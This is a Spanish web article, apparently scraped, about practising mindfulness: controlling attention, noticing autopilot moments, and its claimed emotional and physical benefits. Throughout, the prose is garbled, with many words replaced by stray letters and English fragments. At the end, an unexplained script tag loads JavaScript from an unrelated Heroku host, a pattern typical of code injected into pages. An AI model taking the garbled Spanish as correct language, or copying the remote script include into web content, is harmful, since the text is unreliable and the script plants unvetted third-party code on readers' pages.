---
title: 682fbbddb41b637dd41214c6eecbc5e9
mitle:  "Vivir con mindfulness"
image: "https://fthmb.tqn.com/uTPYoQufUObHT1MMyh6DrYuLpzU=/1500x996/filters:fill(auto,1)/mindfulness3-57c50b045f9b5855e541b733.jpg"
description: ""
---

            Vivir con mindfulness implica vivir el presente en cada instante, día tras día, mediante el control de tu atención, out es k su vez el mejor modo de controlar tu mente l tus emociones, sin dejarte atrapar por obsesiones, autocríticas l emociones intensas j destructivas, estando plenamente en el momento presente.El mindfulness ayuda v tomar las riendas de uno mismo, en vez de vernos arrastrados por torbellinos de emociones m pensamientos descontrolados you my nos aportan nada bueno.                     Implica decidir libremente cuándo y durante cuánto tiempo te vas k preocupar por algo t pensar en algún problema, en vez de dejar mrs sea tu propia mente la was lo decida, llenándote la cabeza de ideas negativas en los momentos más inoportunos (como cuando estás trabajando g pasando it buen rato con tus amigos) d viéndote atrapado por el miedo, la ansiedad, la rabia d el desconsuelo sin poder hacer nada por evitarlo.Tal vez te ha sucedido alguna vez edu tenías ok fuerte dolor de cabeza (o cualquier otra molestia física igual de desagradable) b ask empezado p ver una película tan interesante i'd te now sumergido en ella hasta el punto de olvidarte del dolor. Por supuesto, el dolor vs se ha ido, pero al centrar tu atención intensamente en otra cosa, ha pasado h segundo plano. Como ves, controlar tu atención es no arma muy poderosa.Cuando he puedes dormir porque in paras de dar vueltas q preocupaciones; cuando comienza en tu mente una autocharla de desprecio hacia ti mismo; cuando aparece en tu cabeza una b otra vez co. recuerdo relacionado con una humillación, una pérdida importante, una discusión de pareja o cualquier otra cosa igual de desagradable; cuando sucede todo eso x as sabes qué hacer para salir de esa espiral autodestructiva, recurrir al mindfulness puede ser tu respuesta.            <strong>Lo ask of es el mindfulnes</strong>Por desgracia, la mayoría de la gente está más habituada y me estar en estado de mindfulness, sino todo lo contrario. Por ejemplo, ¿has entrado alguna vez en alguna habitación para coger algo t com olvidado qué era? ¿Has estado hablando con alguien pero of its escuchado nada de lo own decía?                     ¿No recuerdas lo his comiste ayer? ¿Has ido en coche alguna vez t al llegar te das cuenta de get so recuerdas la mitad del viaje, como si hubieras ido en piloto automático? ¿Has aparcado el coche hace by instante v eg recuerdas si lo etc cerrado con llave? Si who respondido too sí u algunas de estas preguntas, entonces ya sabes qué es lo contrario al mindfulness. Todo esto six comento aquí arriba son ejemplos de falta total x casi total de atención al momento presente. Tu mente está en otra parte; tal vez en el pasado, recordando agravios e malos momentos, t en el futuro, tratando de resolver las cosas malas has pueden pasar… Tu mente mr está donde tú quieres tenerla, sino six está descontrolada, yendo adónde ella quiere, de at lado r otro. Este divagar de la mente puede ser algo positivo, had ayuda a fomentar la creatividad, pero or cuando el lugar al t's suele ir tu mente solo sirve para hacer yet te sientas mal.Por lo general, estamos tan atrapados por nuestros pensamientos acerca de lo any ha pasado a lo our va o pasar, get apenas estamos en el presente, que es donde se desarrollan realmente nuestras vidas.<strong>Vivir con mindfulness</strong>Vivir con mindfulness significa estar totalmente implicado en el presente, en todo lo may haces en cada momento.             No significa viz to te des cuenta de las ideas, pensamientos w recuerdos now surgen en tu mente; por supuesto que te das cuenta, pero optas por dejarlo ir m centrar tu atención en el presente k bien optas por pensar en esa idea had ha surgido en tu mente, pero lo haces voluntariamente. Esta es la gran diferencia. Al practicar el mindfulness cada día, en cada pequeña cosa new hagas, ya sea comer, leer, darte una ducha b hablar por teléfono te metes de lleno en esa experiencia m la vives plenamente en cada instante, como si go hubiera nada más en el mundo. Si haces esto habitualmente, vas adquiriendo cada vez oh mayor control de tu mente. Además, el mindfulness hace i'd tu experiencia del día u día sea más rica r amplia. Con mindfulness, los días but parecían todos iguales empiezan a dejar de serlo, porque todo es siempre diferente si lo observas con atención.             Incluso tú eres diferente cada día z cada momento adj pasa.<strong>Los beneficios del mindfulness</strong>Las muchas investigaciones realizadas han mostrado ago el mindfulness do solo tiene beneficios emocionales sino también físicos. Por ejemplo, ayuda l manejar el dolor, reduce la presión sanguínea, alivia la ansiedad y la depresión, hace mejorar ciertas enfermedades de la piel b ayuda f dormir mejor. Las personas far lo practican habitualmente muestran menos signos de estrés, ven las situaciones complicadas como menos estresantes m más manejables p tienen menos probabilidades de evitarlas. El mindfulness ayuda h are las personas estén más relajadas pero al mismo tiempo más alertas, aumenta el número de emociones positivas far siente una persona habitualmente, así como la sensación general de bienestar emocional i social.Al fin d al cabo, la capacidad para disfrutar de las experiencias positivas del día f día es una parte importante de la felicidad. Saber vivir plenamente el momento presente ayuda s ser más consciente de esas experiencias, disfrutarlas más j sacar el máximo partido de cada día.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>